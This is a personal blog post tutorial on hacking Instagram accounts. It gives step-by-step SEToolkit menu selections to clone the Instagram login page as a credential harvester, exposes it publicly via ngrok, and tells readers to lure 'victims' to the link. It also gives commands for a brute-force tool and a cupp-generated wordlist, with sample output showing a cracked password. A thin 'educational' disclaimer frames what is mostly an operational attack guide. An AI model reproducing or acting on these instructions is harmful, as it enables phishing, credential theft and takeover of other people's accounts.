+++
title = "Instagram Hack.!"
date = "2019-02-03"
author = ".!"
cover = "insta.jpg"
description = "My personal experience about instagram hacking.!"
draft = false
+++

## Welcome back to my website guys,
 So, Today we'll talk about Instagram hacking I'll show you some of the techniques which I use for hacking Instagram accounts,,,,,

Yo, Yo, Yo.!! Hold on.!! Take it easy I do stuff ethically with the permission of my friends or siblings, just to show them how easy it is to hack into their insta account.

## Disclaimer :
```
All data and information provided on this website is for informational & Educational purposes only. This Website reserves the right to make changes in the policy of this blog anytime and without prior notice.

I will not be responsible for any action performed by any reader. I mostly focus on Programming, Tutorials, Security Guide, Pentesting tutorials and Ethical hacking. If you planned to use the content for an illegal purpose, please leave this site immediately.
```

### Alright, Let's Get started.!

There are many techniques is available for Instagram hacking, today in this blog we are going to talk about mainly 2 types of Techniques which I use to perform pentest against accounts

- Phishing
- Bruteforcing or Dictionary attack

# Phishing :

## What is a phishing attack.?

Phishing is a type of social engineering attack often used to steal user data, including login credentials and credit card numbers. It occurs when an attacker, masquerading as a trusted entity, dupes a victim into opening an email, instant message, or text message. The recipient is then tricked into clicking a malicious link, which can lead to the installation of malware, the freezing of the system as part of a ransomware attack or the revealing of sensitive information.

An attack can have devastating results. For individuals, this includes unauthorized purchases, the stealing of funds, or identity theft. 

Alright, now so we know what exactly phishing is we can proceed further how we can achieve phising.

### Prerequsistes For this attack :

- [Kali Linux](https://docs.kali.org/category/installation)
- [SEToolkit](https://github.com/trustedsec/social-engineer-toolkit) (pre loaded with kali)
- [ngrok](https://ngrok.com/download)
  
Now first of all boot up your kali and update the repo:

```shell
sudo apt-get update && dis_upgarde -y
```

Check if you have SEToolkit installed by typing *"setoolkit"* inside the terminal if it's there it'll load up the setoolkit or else you have to install it I've given link above go and check that out or simply type this command in terminal :

```shell
sudo apt install setoolkit -y
```
Thereafter you've to install ngrok in system download it from here :
https://ngrok.com/download

>*Note: ngrok is an alternative to port forwarding method, it automatically do all the things for us to setup port forwarding.!

#### Process for setting up your ngrok :

- Unzip :

On Linux or OSX you can unzip ngrok from a terminal with the following command. On Windows, just double click ngrok.zip. 

```shell
unzip /path/to/ngrok.zip
```

Most people like to keep ngrok in their primary user folder or set an alias for easy command-line access. 

- Connect your account :
  
Running this command will add your authtoken to your ngrok.yml file. Connecting an account will list your open tunnels in the dashboard, give you longer tunnel timeouts, and more. Visit the dashboard to get your auth token. 

```shell
./ngrok authtoken <YOUR_AUTH_TOKEN>
```
Login here to generate you're "*Token*" https://dashboard.ngrok.com/user/login

- Fire it up :

Once everything is setup you can fireup the negrok,  to start a HTTP tunnel on port 80, run this next:

```shell
./ngrok http 80
```

You can also type -h to see help menu:

```shell
./ngrok -h
```


### Now once everything is setup we can start with the attack.

Fire up your setoolkit you should see something like this:

```
[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 7.7.9
                   Codename: 'Blackout'
[---]        Follow us on Twitter: @TrustedSec         [---]
[---]        Follow me on Twitter: @HackingDave        [---]
[---]       Homepage: https://www.trustedsec.com       [---]
        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.

     Join us on irc.freenode.net in channel #setoolkit

   The Social-Engineer Toolkit is a product of TrustedSec.

           Visit: https://www.trustedsec.com

   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!


 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

set> 1
```

Select option 1) from the list & you'll see somthing like this 

```
 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) SMS Spoofing Attack Vector
  11) Third Party Modules

  99) Return back to the main menu.

set> 2
```

Now select option number 2) will show following screen:

```
   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) Full Screen Attack Method
   8) HTA Attack Method

  99) Return to Main Menu

set:webattack>3

```

Now select option 3) from the list gives output as :

```
1) Web Templates
   2) Site Cloner
   3) Custom Import

  99) Return to Webattack Menu

set:webattack>2

```

and finally select option 2)

Now it'll ask for Post back IP Address here we want to performe this over WAN withought port forwarding the router and stuff that's why we choose ngrok right.!!

Fire up ngrok with following command :

```shell
./ngrok http 80
```

It'll give following output :

```
ngrok by @inconshreveable                                       (Ctrl+C to quit)
                                                                                
Session Status                online                                            
Account                       m4xx (Plan: paid)                                 
Version                       2.2.8                                             
Region                        United States (us)                                
Web Interface                 http://127.0.0.1:4040                             
Forwarding                    http://feb91dce.ngrok.io -> localhost:80          
Forwarding                    https://feb91dce.ngrok.io -> localhost:80         
                                                                                
Connections                   ttl     opn     rt1     rt5     p50     p90       
                              0       0       0.00    0.00    0.00    0.00      
                                                                            
```

Now two things you can do either get the IP address of following tunneled which is redirecting traffic to our localhots port 80, get ip by copy-pasting the URL "*http://feb91dce.ngrok.io*" in the terminal with ping command (without specifing protocol - https ):

```shell
root@m4xx:~# ping feb91dce.ngrok.io

PING feb91dce.ngrok.io (xx.xx.xx.xx) 56(84) bytes of data.
```

It'll give you IP address of the above domain name copy paste it into setoolkit 

```shell
set:webattack> IP address for the
 POST back in Harvester/Tabnabbing 
 [192.168.0.119]:  "Past here"
```

Or just simply past the URL instad like :

```shell
set:webattack> IP address for the
 POST back in Harvester/Tabnabbing 
 [192.168.0.119]: feb91dce.ngrok.io 
 ```

 Now it'll ask for URL to clone the website 

 ```
 set:webattack> Enter the url to clone:https://www.instagrame.com/
 ```

 You can do it with any website you want to Harvester Credential.! But on your risk, as you read the Disclaimer above :P

 Now Frome here SEToolkit automatically starts apache service for you and setup the whole website and host it on your local machine and with ngrok you have setup the port forwarding "Hurray.!!!!!"

 Now send the website to the victims i.e (http://feb91dce.ngrok.io)
 and use the social engineering you can also shorten the url and customize it to some interesting offers once user click to that link it'll take them to our phishing page which exactly looks like Original one and after user logged in you can see the password in setoolkit terminal



# Bruteforcing / Dictionary attack :

For this you have to download one program: 
This program will brute force any Instagram account you send it it's way. Just give it a target, a password list and a mode then press enter and forget about it. No need to worry about anonymity when using this program, its highest priority is your anonymity,it only attacks when your identity is hidden. 

Git clone it by typing command inside the terminal :

```shell
git clone https://github.com/m4xx101/Brutestagram.git
```
This program is one of the best tool I know have tweaked a little bit to make it more efficient originally its written by *Mohamed*

### Usage :

```shell
python instagram.py <username> <wordlist> -m <mode>
```
 That was the tool description, Now I'll show you how to create wordlist

 Fore creating wordlist we gonna use [cupp](https://github.com/Mebus/cupp) wordlist generator you can git clone it by typing following command :

 ```shell
 git clone https://github.com/Mebus/cupp.git
 ```

 An awsome tool written by Mebus.!

 I've been working on my own wordlist generator tool, I'll post it soon on GitHub and also on the website too, once it gets completed, there are some features which are missing or we can say to make wordlist generation more efficient :) so stay tuned.!

 Yeah and one more thing is you can use any wordlist generator of your wish for this.

 Once you have done with creating wordlist you can fire up tool it'll check all the password in the list and will stop immediately after correct password is found.

 Examle :

 ```shell
root@m4xx:~# python instagram.py 1_M4Xx_0 /root/Desktop/mywordlist.txt
[-] Wordlist: mywordlist.txt
[-] Username: 1_M4Xx_0
[-] Password: abc123
[-] Attempts: 99
[-] Browsers: 59
[-] Exists: True

[!] Password Found
[+] Username: 1_M4Xx_0
[+] Password: abc123
 ```



## Conclusion :

What I think is Phishing would be more easy techniques for getting password because we have many options for performing social engineering but guessing password is gonna be little difficult for us not impossible though.

Again I will not be responsible for any illegal action performed by you.! This is only for Educational purposes only.


###### if you've read the whole article "bass aab rulayega kya pagle.!😢 Thank you so much :).! please share this website with everyone and more is about to coming.!"


##### Here's the GIF which explains my feeling when I finally got my friends password.!

<div style="width:100%;height:0;padding-bottom:56%;position:relative;"><iframe src="https://giphy.com/embed/A9grgCQ0Dm012" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/jim-carrey-power-bruce-almighty-A9grgCQ0Dm012">via GIPHY</a></p>